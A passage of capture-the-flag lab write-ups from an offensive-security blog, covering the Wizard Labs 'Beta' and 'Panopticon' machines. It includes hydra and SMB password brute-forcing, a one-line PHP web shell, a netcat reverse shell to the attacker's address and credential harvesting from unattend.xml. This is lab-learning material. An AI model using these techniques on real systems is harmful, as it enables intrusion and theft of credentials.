+  &lt;figure class=&quot;aligncenter&quot;&gt;&lt;img src=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-30.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-784&quot; srcset=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-30.png?w=686 686w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-30.png?resize=300%2C145 300w&quot; sizes=&quot;(max-width: 680px) 100vw, 680px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;pre&gt;&lt;font color=&quot;#4E9A06&quot;&gt;hydra&lt;/font&gt; -l russel@beta.corp -P &lt;u style=&quot;text-decoration-style:single&quot;&gt;list.txt&lt;/u&gt; 10.1.1.15 http-post-form &lt;font color=&quot;#C4A000&quot;&gt;&quot;/user/login:username=^USER^&amp;amp;password=^PASS^@Login=Login:Username&quot;&lt;/font&gt; -V -s 3000
+&lt;/pre&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;[ATTEMPT] target 10.1.1.15 - login &quot;russel&quot; - pass &quot;summer3&quot; - 446 of 450 [child 5] (0/0)
+[ATTEMPT] target 10.1.1.15 - login &quot;russel&quot; - pass &quot;honey2&quot; - 447 of 450 [child 1] (0/0)
+[ATTEMPT] target 10.1.1.15 - login &quot;russel&quot; - pass &quot;honey2&quot; - 448 of 450 [child 6] (0/0)
+[ATTEMPT] target 10.1.1.15 - login &quot;russel&quot; - pass &quot;summer2&quot; - 449 of 450 [child 2] (0/0)
+[ATTEMPT] target 10.1.1.15 - login &quot;russel&quot; - pass &quot;lollip0p4&quot; - 450 of 450 [child 7] (0/0)
+1 of 1 target completed, 0 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-04-17 12:18:14
+&lt;span style=&quot;background-color:#2E3436&quot;&gt; &lt;/span&gt;&lt;span style=&quot;background-color:#2E3436&quot;&gt;&lt;font color=&quot;#CC0000&quot;&gt;✘ &lt;/font&gt;&lt;/span&gt;&lt;span style=&quot;background-color:#2E3436&quot;&gt;&lt;font color=&quot;#C4A000&quot;&gt;⚡ &lt;/font&gt;&lt;/span&gt;&lt;span style=&quot;background-color:#3465A4&quot;&gt;&lt;font color=&quot;#2E3436&quot;&gt; ~/Desktop/beta &lt;/font&gt;&lt;/span&gt;&lt;font color=&quot;#3465A4&quot;&gt;&lt;/font&gt; 
+&lt;/pre&gt;
+
+&lt;p&gt;I realised there was a better way to generate the passwords&lt;/p&gt;
+
+&lt;pre&gt;&lt;span style=&quot;background-color:#2E3436&quot;&gt; &lt;/span&gt;&lt;span style=&quot;background-color:#2E3436&quot;&gt;&lt;font color=&quot;#CC0000&quot;&gt;✘ &lt;/font&gt;&lt;/span&gt;&lt;span style=&quot;background-color:#2E3436&quot;&gt;&lt;font color=&quot;#C4A000&quot;&gt;⚡ &lt;/font&gt;&lt;/span&gt;&lt;span style=&quot;background-color:#3465A4&quot;&gt;&lt;font color=&quot;#2E3436&quot;&gt; ~/Desktop/beta &lt;/font&gt;&lt;/span&gt;&lt;font color=&quot;#3465A4&quot;&gt;&lt;/font&gt; &lt;font color=&quot;#4E9A06&quot;&gt;cat&lt;/font&gt; &lt;u style=&quot;text-decoration-style:single&quot;&gt;pass1&lt;/u&gt;                
+lollip0p
+rain
+summer
+little
+honey
+&lt;span style=&quot;background-color:#2E3436&quot;&gt; &lt;/span&gt;&lt;span style=&quot;background-color:#2E3436&quot;&gt;&lt;font color=&quot;#CC0000&quot;&gt;✘ &lt;/font&gt;&lt;/span&gt;&lt;span style=&quot;background-color:#2E3436&quot;&gt;&lt;font color=&quot;#C4A000&quot;&gt;⚡ &lt;/font&gt;&lt;/span&gt;&lt;span style=&quot;background-color:#3465A4&quot;&gt;&lt;font color=&quot;#2E3436&quot;&gt; ~/Desktop/beta &lt;/font&gt;&lt;/span&gt;&lt;font color=&quot;#3465A4&quot;&gt;&lt;/font&gt; &lt;font color=&quot;#C4A000&quot;&gt;for&lt;/font&gt; i in &lt;font color=&quot;#75507B&quot;&gt;$(&lt;/font&gt;&lt;font color=&quot;#4E9A06&quot;&gt;cat&lt;/font&gt; &lt;u style=&quot;text-decoration-style:single&quot;&gt;pass1&lt;/u&gt;&lt;font color=&quot;#75507B&quot;&gt;)&lt;/font&gt;; &lt;font color=&quot;#C4A000&quot;&gt;do&lt;/font&gt; &lt;font color=&quot;#4E9A06&quot;&gt;echo&lt;/font&gt; $i{1..5} &amp;gt;&amp;gt; &lt;u style=&quot;text-decoration-style:single&quot;&gt;output&lt;/u&gt;;&lt;font color=&quot;#C4A000&quot;&gt;done&lt;/font&gt;
+&lt;span style=&quot;background-color:#2E3436&quot;&gt; &lt;/span&gt;&lt;span style=&quot;background-color:#2E3436&quot;&gt;&lt;font color=&quot;#C4A000&quot;&gt;⚡ &lt;/font&gt;&lt;/span&gt;&lt;span style=&quot;background-color:#3465A4&quot;&gt;&lt;font color=&quot;#2E3436&quot;&gt; ~/Desktop/beta &lt;/font&gt;&lt;/span&gt;&lt;font color=&quot;#3465A4&quot;&gt;&lt;/font&gt; &lt;font color=&quot;#4E9A06&quot;&gt;cat&lt;/font&gt; &lt;u style=&quot;text-decoration-style:single&quot;&gt;output&lt;/u&gt; 
+lollip0p1 lollip0p2 lollip0p3 lollip0p4 lollip0p5
+rain1 rain2 rain3 rain4 rain5
+summer1 summer2 summer3 summer4 summer5
+little1 little2 little3 little4 little5
+honey1 honey2 honey3 honey4 honey5
+&lt;span style=&quot;background-color:#2E3436&quot;&gt; &lt;/span&gt;&lt;span style=&quot;background-color:#2E3436&quot;&gt;&lt;font color=&quot;#C4A000&quot;&gt;⚡ &lt;/font&gt;&lt;/span&gt;&lt;span style=&quot;background-color:#3465A4&quot;&gt;&lt;font color=&quot;#2E3436&quot;&gt; ~/Desktop/beta &lt;/font&gt;&lt;/span&gt;&lt;font color=&quot;#3465A4&quot;&gt;&lt;/font&gt; 
+&lt;/pre&gt;
+
+&lt;p&gt;I took a step back and looked at the nmap scan results and seem there were SMB ports open. enum4linux and smbmap revealed nothing but nmap came back and revealed 3 shares that require passwords to access.&lt;/p&gt;
+
+&lt;pre&gt;&lt;font color=&quot;#4E9A06&quot;&gt;nmap&lt;/font&gt; $ip -p 445,139 &lt;font color=&quot;#C4A000&quot;&gt;&quot;--script=smb-enum*&quot;
+Host script results:
+| smb-enum-shares: 
+|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
+|   account_used: &amp;lt;blank&amp;gt;
+|   \\10.1.1.15\ADMIN$: 
+|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+|     Anonymous access: &amp;lt;none&amp;gt;
+|   \\10.1.1.15\C$: 
+|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+|     Anonymous access: &amp;lt;none&amp;gt;
+|   \\10.1.1.15\IPC$: 
+|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+|_    Anonymous access: READ
+&lt;/font&gt;
+&lt;/pre&gt;
+
+&lt;p&gt;I used the following script to try all passwords combos&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;&lt;span style=&quot;background-color:#2E3436&quot;&gt; &lt;/span&gt;&lt;span style=&quot;background-color:#2E3436&quot;&gt;&lt;font color=&quot;#CC0000&quot;&gt;✘ &lt;/font&gt;&lt;/span&gt;&lt;span style=&quot;background-color:#2E3436&quot;&gt;&lt;font color=&quot;#C4A000&quot;&gt;⚡ &lt;/font&gt;&lt;/span&gt;&lt;span style=&quot;background-color:#3465A4&quot;&gt;&lt;font color=&quot;#2E3436&quot;&gt; ~/Desktop/beta &lt;/font&gt;&lt;/span&gt;&lt;font color=&quot;#3465A4&quot;&gt;&lt;/font&gt; &lt;font color=&quot;#C4A000&quot;&gt;for&lt;/font&gt; i in &lt;font color=&quot;#75507B&quot;&gt;$(&lt;/font&gt;&lt;font color=&quot;#4E9A06&quot;&gt;cat&lt;/font&gt; &lt;u style=&quot;text-decoration-style:single&quot;&gt;output&lt;/u&gt;&lt;font color=&quot;#75507B&quot;&gt;)&lt;/font&gt;; &lt;font color=&quot;#C4A000&quot;&gt;do&lt;/font&gt; &lt;font color=&quot;#4E9A06&quot;&gt;echo&lt;/font&gt; $i &amp;amp;&amp;amp;  &lt;font color=&quot;#4E9A06&quot;&gt;smbclient&lt;/font&gt; //$ip/admin$ -U russel $i; &lt;font color=&quot;#C4A000&quot;&gt;done&lt;/font&gt;
+...
+session setup failed: NT_STATUS_LOGON_FAILURE
+little5
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&amp;gt; dir
+  .                                   D        0  Sun Sep 23 14:34:50 2018
+  ..                                  D        0  Sun Sep 23 14:34:50 2018
+  addins                              D        0  Tue Jul 14 05:52:31 2009
+  AppCompat                           D        0  Tue Jul 14 03:37:05 2009
+  AppPatch                            D        0  Tue Apr 12 03:16:01 2011
+  assembly                          DSR        0  Sat Sep 22 20:55:40 2018
+&lt;/pre&gt;
+
+&lt;p&gt;username = russel&lt;br /&gt;
+password = little5&lt;/p&gt;
+
+&lt;p&gt;Using the put command in smb I added a shell exec file called webby.php and put it into c:\xampp\htdocs so I could access it.&lt;/p&gt;
+
+&lt;p&gt;webby.php contains&lt;br /&gt;
+&lt;?php echo shell\_exec($\_GET[&amp;#8216;cmd&amp;#8217;]); ?&gt;&lt;/p&gt;
+
+&lt;p&gt;I get command execution&lt;/p&gt;
+
+&lt;div class=&quot;wp-block-image&quot;&gt;
+  &lt;figure class=&quot;aligncenter&quot;&gt;&lt;img src=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-24.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-751&quot; srcset=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-24.png?w=610 610w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-24.png?resize=300%2C83 300w&quot; sizes=&quot;(max-width: 610px) 100vw, 610px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;wp-block-image&quot;&gt;
+  &lt;figure class=&quot;aligncenter&quot;&gt;&lt;img src=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-25.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-752&quot; srcset=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-25.png?w=718 718w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-25.png?resize=300%2C142 300w&quot; sizes=&quot;(max-width: 680px) 100vw, 680px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;To get a nc shell I ran the following with a listener – nc -lnvp 443 :&lt;/p&gt;
+
+&lt;p&gt;http://10.1.1.15/webby.php?cmd=nc.exe 10.253.0.255 443 -e cmd.exe&lt;/p&gt;
+
+&lt;div class=&quot;wp-block-image&quot;&gt;
+  &lt;figure class=&quot;aligncenter&quot;&gt;&lt;img src=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-26.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-753&quot; srcset=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-26.png?w=616 616w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-26.png?resize=300%2C62 300w&quot; sizes=&quot;(max-width: 616px) 100vw, 616px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Running through my &lt;a href=&quot;https://guide.offsecnewbie.com/privilege-escalation/windows-pe&quot;&gt;Win Priv&lt;/a&gt; checks reveals the admin password&lt;/p&gt;
+
+&lt;pre&gt;C:\xampp\htdocs&amp;gt;type c:\unattend.xml
+type c:\unattend.xml
+&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;
+&amp;lt;unattend xmlns=&quot;urn:schemas-microsoft-com:unattend&quot;&amp;gt;
+    &amp;lt;settings pass=&quot;windowsPE&quot;&amp;gt;
+        &amp;lt;component name=&quot;Microsoft-Windows-Setup&quot; publicKeyToken=&quot;31bf3856ad364e35&quot; language=&quot;neutral&quot; versionScope=&quot;nonSxS&quot; processorArchitecture=&quot;amd64&quot;&amp;gt;
+            &amp;lt;WindowsDeploymentServices&amp;gt;
+                &amp;lt;Login&amp;gt;
+                    &amp;lt;WillShowUI&amp;gt;OnError&amp;lt;/WillShowUI&amp;gt;
+                    &amp;lt;Credentials&amp;gt;
+                        &amp;lt;Username&amp;gt;Administrator&amp;lt;/Username&amp;gt;
+                        &amp;lt;Domain&amp;gt;beta&amp;lt;/Domain&amp;gt;
+                        &amp;lt;mark&amp;gt;&amp;lt;Password&amp;gt;loveLyp4ssw0rd*!&amp;lt;/Password&amp;gt;&amp;lt;/mark&amp;gt;
+                    &amp;lt;/Credentials&amp;gt;
+&lt;/pre&gt;
+
+&lt;p&gt;Using smbclient logging in as Administrator I was able to capture the root flag&lt;/p&gt;
+
+&lt;pre&gt;&lt;span style=&quot;background-color:#2E3436&quot;&gt; &lt;/span&gt;&lt;span style=&quot;background-color:#2E3436&quot;&gt;&lt;font color=&quot;#C4A000&quot;&gt;⚡ &lt;/font&gt;&lt;/span&gt;&lt;span style=&quot;background-color:#3465A4&quot;&gt;&lt;font color=&quot;#2E3436&quot;&gt; ~/Desktop/beta &lt;/font&gt;&lt;/span&gt;&lt;font color=&quot;#3465A4&quot;&gt;&lt;/font&gt; &lt;font color=&quot;#4E9A06&quot;&gt;smbclient&lt;/font&gt; //$ip/C$ -U administrator
+Enter WORKGROUP\administrator';s password: 
+&lt;/pre&gt;
+
+&lt;pre&gt;smb: \Users\Administrator\Desktop\&amp;gt; mget root.txt 
+Get file root.txt? y
+getting file \Users\Administrator\Desktop\root.txt of size 32 as root.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+&lt;/pre&gt;
+
+&lt;p&gt;Fun box which felt quite OSCP like, especially when it had me down a rabbit hole of the Gogs web application.&lt;/p&gt;
+
+&lt;div class=&quot;wp-block-image&quot;&gt;
+  &lt;figure class=&quot;aligncenter&quot;&gt;&lt;img src=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-31.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-798&quot; srcset=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-31.png?w=349 349w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-31.png?resize=300%2C52 300w&quot; sizes=&quot;(max-width: 349px) 100vw, 349px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;figcaption&gt;f1f95d42573c2f3940bfae6fdba05e5a&lt;/figcaption&gt;&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;I tried to use the “runas” command to start a nc reverse shell as administrator but couldn’t get it working. If you did, let me know how you did it.&lt;/p&gt;</content><author><name>rowbot</name></author><summary type="html"></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://0.0.0.0:4000/wp-content/uploads/2019/04/beta-174x250.png" /></entry><entry><title type="html">Wizard Labs – Panopticon</title><link href="http://0.0.0.0:4000/2019/04/16/wizard-labs-panopticon/" rel="alternate" type="text/html" title="Wizard Labs &amp;#8211; Panopticon" /><published>2019-04-16T07:32:16+00:00</published><updated>2019-04-16T07:32:16+00:00</updated><id>http://0.0.0.0:4000/2019/04/16/wizard-labs-panopticon</id><content type="html" xml:base="http://0.0.0.0:4000/2019/04/16/wizard-labs-panopticon/">&lt;div class=&quot;wp-block-image&quot;&gt;
+  &lt;figure class=&quot;aligncenter&quot;&gt;&lt;img src=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-637&quot; srcset=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image.png?w=192 192w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image.png?resize=167%2C300 167w&quot; sizes=&quot;(max-width: 192px) 100vw, 192px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;figcaption&gt; &lt;br /&gt;&lt;a href=&quot;https://labs.wizard-security.net/&quot;&gt;https://labs.wizard-security.net&lt;/a&gt; &lt;/figcaption&gt;&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;I found getting the user on this box very easy, I think it took me &amp;lt; 10 minutes. Then after about another 10 minutes I roughly knew what I had to do to get root but for the guts of 3 hours couldn’t figure out why I wasn’t getting the cron job to execute my script! I figured it out in the end, I just had to take a step back and re-read the /var/mail/seer log.&lt;/p&gt;
+
+&lt;hr class=&quot;wp-block-separator&quot; /&gt;
+
+&lt;p&gt;Ran the following nmap scan: nmap -sC -sV -oA all -vv -p- 10.1.1.34.&lt;/p&gt;
+
+&lt;div class=&quot;wp-block-image&quot;&gt;
+  &lt;figure class=&quot;aligncenter&quot;&gt;&lt;img src=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-2.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-640&quot; srcset=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-2.png?w=956 956w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-2.png?resize=300%2C76 300w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-2.png?resize=768%2C195 768w&quot; sizes=&quot;(max-width: 680px) 100vw, 680px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;What stood out to me was port 80, maybe some interesting directories or a web app attack could be carried out. Port 139 and 445 was SAMBA- always interesting to see what I can access through open shares or vulnerable versions.&lt;/p&gt;
+
+&lt;p&gt;Port 80 revealed a website. I didn’t poke about the website as it looked quite flat, the only entry point was the contact form – that I could see. I was keen to move on to what I could see from the SAMBA share.&lt;/p&gt;
+
+&lt;div class=&quot;wp-block-image&quot;&gt;
+  &lt;figure class=&quot;aligncenter&quot;&gt;&lt;img src=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-3.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-643&quot; srcset=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-3.png?w=899 899w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-3.png?resize=300%2C218 300w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-3.png?resize=768%2C558 768w&quot; sizes=&quot;(max-width: 680px) 100vw, 680px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;I ran smbmap to enumerate the SAMBA share and discover the Public share can be read. &lt;a href=&quot;https://guide.offsecnewbie.com/network-pen#smbmap&quot;&gt;https://guide.offsecnewbie.com/network-pen#smbmap&lt;/a&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;span style=&quot;background-color:#2E3436&quot;&gt; &lt;/span&gt;&lt;span style=&quot;background-color:#2E3436&quot;&gt;&lt;font color=&quot;#C4A000&quot;&gt;⚡ &lt;/font&gt;&lt;/span&gt;&lt;span style=&quot;background-color:#3465A4&quot;&gt;&lt;font color=&quot;#2E3436&quot;&gt; ~/Desktop/panopticon &lt;/font&gt;&lt;/span&gt;&lt;font color=&quot;#3465A4&quot;&gt;&lt;/font&gt; &lt;font color=&quot;#4E9A06&quot;&gt;smbmap&lt;/font&gt; -H $ip
+[+] Finding open SMB ports....
+[+] Guest SMB session established on 10.1.1.34...
+[+] IP: 10.1.1.34:445	Name: panopticon.wl                                     
+	Disk                                                  	Permissions
+	----                                                  	-----------
+	public                                            	READ ONLY
+	IPC$                                              	NO ACCESS
+&lt;/pre&gt;
+
+&lt;p&gt;I discovered a zip file called old-site.zip.&lt;/p&gt;
+
+&lt;pre&gt;&lt;span style=&quot;background-color:#2E3436&quot;&gt; &lt;/span&gt;&lt;span style=&quot;background-color:#2E3436&quot;&gt;&lt;font color=&quot;#C4A000&quot;&gt;⚡ &lt;/font&gt;&lt;/span&gt;&lt;span style=&quot;background-color:#3465A4&quot;&gt;&lt;font color=&quot;#2E3436&quot;&gt; ~/Desktop/panopticon &lt;/font&gt;&lt;/span&gt;&lt;font color=&quot;#3465A4&quot;&gt;&lt;/font&gt; &lt;font color=&quot;#4E9A06&quot;&gt;smbmap&lt;/font&gt; -R Public -H $ip &lt;font color=&quot;#555753&quot;&gt;&lt;b&gt;#Recursively list dirs, and files&lt;/b&gt;&lt;/font&gt;
+[+] Finding open SMB ports....
+[+] Guest SMB session established on 10.1.1.34...
+[+] IP: 10.1.1.34:445	Name: panopticon.wl                                     
+	Disk                                                  	Permissions
+	----                                                  	-----------
+	Public                                            	READ ONLY
+	.\
+	dr--r--r--                0 Sun Jun 17 16:17:11 2018	.
+	dr--r--r--                0 Sat Feb 24 19:27:52 2018	..
+	-r--r--r--           427943 Sat Feb 24 19:57:46 2018	old-site.zip
+&lt;/pre&gt;
+
+&lt;p&gt;I downloaded it. As you can see smbmap is a nice little tool. I prefer it to enum4linux – though enum4linux does a few different things.&lt;/p&gt;
+
+&lt;pre&gt;&lt;span style=&quot;background-color:#2E3436&quot;&gt; &lt;/span&gt;&lt;span style=&quot;background-color:#2E3436&quot;&gt;&lt;font color=&quot;#C4A000&quot;&gt;⚡ &lt;/font&gt;&lt;/span&gt;&lt;span style=&quot;background-color:#3465A4&quot;&gt;&lt;font color=&quot;#2E3436&quot;&gt; ~/Desktop/panopticon &lt;/font&gt;&lt;/span&gt;&lt;font color=&quot;#3465A4&quot;&gt;&lt;/font&gt; &lt;font color=&quot;#4E9A06&quot;&gt;smbmap&lt;/font&gt; -R Public -H $ip -A old-site.zip -q &lt;font color=&quot;#555753&quot;&gt;&lt;b&gt;#downloads a file in quiet mode&lt;/b&gt;&lt;/font&gt;
+[+] Finding open SMB ports....
+[+] Guest SMB session established on 10.1.1.34...
+[+] IP: 10.1.1.34:445	Name: panopticon.wl                                     
+	Disk                                                  	Permissions
+	----                                                  	-----------
+	[+] Match found! Downloading: Public\.\old-site.zip
+	Public                                            	READ ONLY
+	[+] Starting search for files matching 'old-site.zip' on share Public.
+	[+] Match found! Downloading: Public\old-site.zip
+&lt;/pre&gt;
+
+&lt;p&gt;I knew that I there would be a config file which I could get a password or user from. So I unzipped the file.&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;/figure&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-4.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-661&quot; srcset=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-4.png?w=598 598w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-4.png?resize=300%2C236 300w&quot; sizes=&quot;(max-width: 598px) 100vw, 598px&quot; data-recalc-dims=&quot;1&quot; /&gt; &amp;lt;/figure&amp;gt; &lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-5.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-662&quot; srcset=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-5.png?w=574 574w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-5.png?resize=300%2C43 300w&quot; sizes=&quot;(max-width: 574px) 100vw, 574px&quot; data-recalc-dims=&quot;1&quot; /&gt;&amp;lt;figcaption&amp;gt;username and password captured.&amp;lt;/figcaption&amp;gt;&lt;/figure&gt;&lt;/p&gt;
+
+&lt;p&gt;I remembered that there was an ssh port open and tried to login with those creds.&lt;/p&gt;
+
+&lt;pre&gt;&lt;span style=&quot;background-color:#2E3436&quot;&gt; &lt;/span&gt;&lt;span style=&quot;background-color:#2E3436&quot;&gt;&lt;font color=&quot;#C4A000&quot;&gt;⚡ &lt;/font&gt;&lt;/span&gt;&lt;span style=&quot;background-color:#3465A4&quot;&gt;&lt;font color=&quot;#2E3436&quot;&gt; ~/Desktop/panopticon &lt;/font&gt;&lt;/span&gt;&lt;font color=&quot;#3465A4&quot;&gt;&lt;/font&gt; &lt;font color=&quot;#4E9A06&quot;&gt;ssh&lt;/font&gt; seer@$ip                                                              
+seer@10.1.1.34';s password: 
+Linux Panopticon 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+&amp;lt;mark&amp;gt;You have new mail.&amp;lt;/mark&amp;gt;
+Last login: Sun Dec  2 09:18:32 2018 from 10.253.1.0
+&lt;font color=&quot;#8AE234&quot;&gt;&lt;b&gt;seer@Panopticon&lt;/b&gt;&lt;/font&gt;:&lt;font color=&quot;#729FCF&quot;&gt;&lt;b&gt;~&lt;/b&gt;&lt;/font&gt;$ cat /home/seer/user.txt 
+6d3934480b23c0ca3d164cf19fa11946
+&lt;font color=&quot;#8AE234&quot;&gt;&lt;b&gt;seer@Panopticon&lt;/b&gt;&lt;/font&gt;:&lt;font color=&quot;#729FCF&quot;&gt;&lt;b&gt;~&lt;/b&gt;&lt;/font&gt;$ 
+&lt;/pre&gt;
+
+&lt;p&gt;I noticed when I logged in that I received a message that I had new mail. I highlighted it above.&lt;/p&gt;
+
+&lt;p&gt;I knew that mail for the user is located in /var/mail/seer in this instance.&lt;br /&gt;
+What does it contain, and who/what sent it? Most often the messages contain output of cron jobs, or a system security report by logwatch, or similar things. Time to read it!&lt;/p&gt;
+
+&lt;div class=&quot;wp-block-image&quot;&gt;
+  &lt;figure class=&quot;aligncenter&quot;&gt;&lt;img src=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-6.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-668&quot; srcset=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-6.png?w=676 676w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-6.png?resize=237%2C300 237w&quot; sizes=&quot;(max-width: 676px) 100vw, 676px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;The mail file was very big&lt;/p&gt;
+
+&lt;pre&gt;&lt;font color=&quot;#8AE234&quot;&gt;&lt;b&gt;seer@Panopticon&lt;/b&gt;&lt;/font&gt;:&lt;font color=&quot;#729FCF&quot;&gt;&lt;b&gt;~&lt;/b&gt;&lt;/font&gt;$ ls -la /var/mail/seer 
+-rw-rw---- 1 seer mail 23172905 Dec  2 11:36 /var/mail/seer
+&lt;/pre&gt;
+
+&lt;div class=&quot;wp-block-image&quot;&gt;
+  &lt;figure class=&quot;aligncenter&quot;&gt;&lt;img src=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-7.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-671&quot; srcset=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-7.png?w=498 498w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-7.png?resize=300%2C103 300w&quot; sizes=&quot;(max-width: 498px) 100vw, 498px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;figcaption&gt;I&amp;#8217;m terrible at reading file sizes and working them out to something I can understand so I turn to Google&lt;/figcaption&gt;&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;I scrolled through and seen reference to a hidden bash script called .lol.sh&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;Subject: Cron &amp;lt;root@Panopticon&amp;gt; bash /var/tmp/.lol.sh
+&lt;/pre&gt;
+
+&lt;pre&gt;&lt;font color=&quot;#8AE234&quot;&gt;&lt;b&gt;seer@Panopticon&lt;/b&gt;&lt;/font&gt;:&lt;font color=&quot;#729FCF&quot;&gt;&lt;b&gt;~/dev_departement&lt;/b&gt;&lt;/font&gt;$ ls -la /var/tmp/.lol.sh 
+-rwx------ 1 root root 125 Jun 27 14:38 &lt;font color=&quot;#8AE234&quot;&gt;&lt;b&gt;/var/tmp/.lol.sh&lt;/b&gt;&lt;/font&gt;
+You have new mail in /var/mail/seer
+&lt;/pre&gt;
+
+&lt;p&gt;In Seer’s home directory there was a folder called dev_departement (spelled incorrectly). Maybe the machine’s author is French?&lt;/p&gt;
+
+&lt;div class=&quot;wp-block-image&quot;&gt;
+  &lt;figure class=&quot;aligncenter&quot;&gt;&lt;img src=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-8.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-673&quot; srcset=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-8.png?w=511 511w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-8.png?resize=300%2C211 300w&quot; sizes=&quot;(max-width: 511px) 100vw, 511px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;/figure&gt;
+&lt;/div&gt;
+&lt;p&gt;The bad spelling and grammar continues when I looked at dev.txt 🙂&lt;/p&gt;
+
